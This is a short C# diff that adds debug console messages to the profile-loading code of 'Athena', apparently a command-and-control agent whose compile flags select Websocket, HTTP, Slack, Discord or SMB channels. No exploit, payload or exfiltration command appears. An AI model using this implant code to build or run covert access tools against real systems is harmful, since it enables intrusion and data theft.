@@ -116,18 +116,23 @@ namespace Athena
             List<string> profiles = new List<string>();
             Dictionary<string, IConfig> configs = new Dictionary<string, IConfig>();
 #if WEBSOCKET
+Console.WriteLine("Adding Websocket.");
 profiles.Add("Athena.Profiles.Websocket");
 #endif
 #if HTTP
+Console.WriteLine("Adding HTTP.");
 profiles.Add("Athena.Profiles.HTTP");
 #endif
 #if SLACK
+Console.WriteLine("Adding Slack.");
 profiles.Add("Athena.Profiles.Slack");
 #endif
 #if DISCORD
+Console.WriteLine("Adding Discord.");
 profiles.Add("Athena.Profiles.Discord");
 #endif
 #if SMB
+Console.WriteLine("Adding SMB.");
 profiles.Add("Athena.Profiles.SMB");
 #endif
 
@@ -136,18 +141,21 @@ profiles.Add("Athena.Profiles.SMB");
 #else
             foreach (var profile in profiles)
             {
+                Console.WriteLine("Attempting to load " + profile);
                 try
                 {
                     Assembly _tasksAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
 
                     if (_tasksAsm == null)
                     {
+                        Console.WriteLine("Task is null.");
                         continue;
                     }
                     foreach (Type t in _tasksAsm.GetTypes())
                     {
                         if (typeof(IConfig).IsAssignableFrom(t))
                         {
+                            Console.WriteLine("Found Profile: " + profile);
                             configs.Add(profile.ToUpper(), (IConfig)Activator.CreateInstance(t));
                         }
                     }
